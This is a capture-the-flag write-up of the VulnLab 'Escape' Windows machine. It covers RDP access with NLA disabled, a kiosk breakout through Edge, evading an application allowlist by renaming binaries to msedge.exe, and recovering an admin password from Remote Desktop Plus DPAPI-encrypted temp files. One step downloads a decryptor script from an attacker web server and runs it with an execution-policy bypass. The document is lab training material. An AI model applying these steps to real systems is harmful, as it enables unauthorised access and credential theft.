---
title: Escape
date: 2026-02-10T00:00:00
draft: false
sources: "VulnLab"
difficulties: Easy
tags: ["Windows", "RDP", "UAC Bypass", "Kiosk Escape"]
author: Anx
description: This challenge involves compromising a Windows host exposed via RDP, starting from a passwordless kiosk account. After enumerating the service with Nmap and bypassing NLA, access to a restricted desktop is obtained. By escaping kiosk mode, extracting encrypted credentials from a third-party application (Remote Desktop Pro), the administrator password is recovered, leading to privilege escalation and full administrative access.
---
![alt text](featured.png)

## Nmap
The challenge was started by running Nmap to enumerate the server's ports and services.
```bash
sudo nmap -p- -sCV 10.10.124.49 -oA nmap/fulltcp-Escape

Nmap scan report for 10.10.124.49
Host is up (0.049s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-10T14:30:09+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=Escape
| Not valid before: 2026-02-09T13:56:10
|_Not valid after:  2026-08-11T13:56:10
| rdp-ntlm-info: 
|   Target_Name: ESCAPE
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   DNS_Domain_Name: Escape
|   DNS_Computer_Name: Escape
|   Product_Version: 10.0.19041
|_  System_Time: 2026-02-10T14:30:04+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1755.60 seconds
```
The scan confirmed that the target was a Windows host with the RDP port open.

## Foothold
Since no user information was available, an attempt was made to access the service by disabling Network Level Authentication (NLA) via the /sec:nla:off parameter.

> [!NOTE]
> By default, Windows requires user authentication prior to establishing a connection; however, disabling Network Level Authentication (NLA) allows a user to access the graphical login interface before providing credentials.

```bash
xfreerdp3 /v:10.10.124.49 /u:"" /p:"" /cert:ignore /sec:nla:off
```

![](Pasted%20image%2020260210161717.png)

Upon accessing the Windows login screen, a message revealed that the host functions as a Conference Display and that a user named 'KioskUser0' can access the system without a password.

```bash
xfreerdp3 /v:10.10.124.49 /u:"KioskUser0" /p:"" /cert:ignore /sec:nla:off +clipboard
```

![](Pasted%20image%2020260210161906.png)

## Escape kiosk mode
Using the KioskUser0 account, access to a Windows desktop operating in Kiosk mode was obtained. The next objective was to attempt a breakout from the restricted environment in order to gain full interactive user access.

![](Pasted%20image%2020260210163238.png)

By pressing the Windows key and typing directly, the search interface was displayed, which allowed `msedge.exe` (Microsoft Edge) to be launched.

![](Pasted%20image%2020260210163307.png)

With Microsoft Edge open, it was possible to browse the file system by entering `C://` in the address bar. This allowed navigation across accessible directories.
During this process, a file named `profiles.xml`, associated with the software _Remote Desktop Plus_, was identified. The file contained credentials for the `admin` user.

![](Pasted%20image%2020260210163611.png)

The current user was restricted to accessing files located in the `Downloads` directory via File Explorer. Therefore, the _Remote Desktop Plus_ executable was downloaded through Microsoft Edge and saved to the `Downloads` directory.

![](Pasted%20image%2020260210170058.png)

After attempting to execute the file, the system blocked the execution and displayed the following error message:
>"This operation has been cancelled due to system restrictions. Please contact the system administrator."

![](Pasted%20image%2020260210170222.png)

To bypass the restriction, the file was renamed to match the name of an executable that the user was permitted to run, `msedge.exe` in this scenario.

![](Pasted%20image%2020260210170432.png)

The program provides functionality to import profiles from an XML file. However, to access the file located in the `_admin` directory, it was necessary to first download it to the `Downloads` folder, similar to the approach used for the executable file. In this case, the download was performed by opening the file in the browser and pressing Ctrl + S.

![](Pasted%20image%2020260210170923.png)

Next, the file was imported on the Remote Desktop Plus program.
![](Pasted%20image%2020260210170953.png)
![](Pasted%20image%2020260210171012.png)

The profile was selected; however, it was not possible to establish an RDP connection to the host.
![](Pasted%20image%2020260210171145.png)
![](Pasted%20image%2020260210171255.png)

After further investigation, it was determined that the application temporarily writes encrypted .rdp credential files to the `%LOCALAPPDATA%\Temp directory`. These files are created by Remote Desktop Plus during connection attempts and encrypted using the current user’s Data Protection API (DPAPI) context.
- Source: https://github.com/Yeeb1/SharpRDPlusSnatcher

First, it was confirmed that the temporary files were generated and that their content contained the encrypted password for the `admin` user.

![](Pasted%20image%2020260210171747.png)
![](Pasted%20image%2020260210171803.png)

To obtain a PowerShell console and continue the attack, the PowerShell executable was downloaded to the `Downloads` folder and renamed to `msedge.exe`, following the same evasion technique described previously.

![](Pasted%20image%2020260210174350.png)
![](Pasted%20image%2020260210174536.png)

Next, the tool referenced in the aforementioned GitHub repository was downloaded to the attacking machine and subsequently transferred to the target machine using a temporary Python web server and the PowerShell console.
- Source: https://github.com/RedAndBlueEraser/rdp-file-password-encryptor

```bash
python3 -m http.server 80
```

![](Pasted%20image%2020260210174746.png)

```powershell
wget 10.0.0.46/rdp-file-password-decryptor.ps1 -O rdp-file-password-decryptor.ps1
```

![](Pasted%20image%2020260210174736.png)

Then the following command was executed to run a new PowerShell session while temporarily ignoring the execution policy restrictions to run the script and decrypt the hash to obtain the cleartext password for the user `admin`.

```powershell
powershell -ep bypass
.\rdp-file-password-decryptor.ps1 0100....B298
```

![](Pasted%20image%2020260210174918.png)

Finally, the `runas` utility was executed to spawn a new PowerShell console running under the `admin` user context.

```powershell
runas /user:admin powershell.exe
```

![](Pasted%20image%2020260210175437.png)

## Privilege escalation

To escalate privileges, the following command was simply executed, which starts a new instance of PowerShell requesting elevation via UAC (-Verb runas), thereby displaying a prompt to run the process as an administrator if the user has the appropriate permissions.

```powershell
Start-Process powershell.exe -Verb runas
```

![](Pasted%20image%2020260210180012.png)

![](Pasted%20image%2020260210180123.png)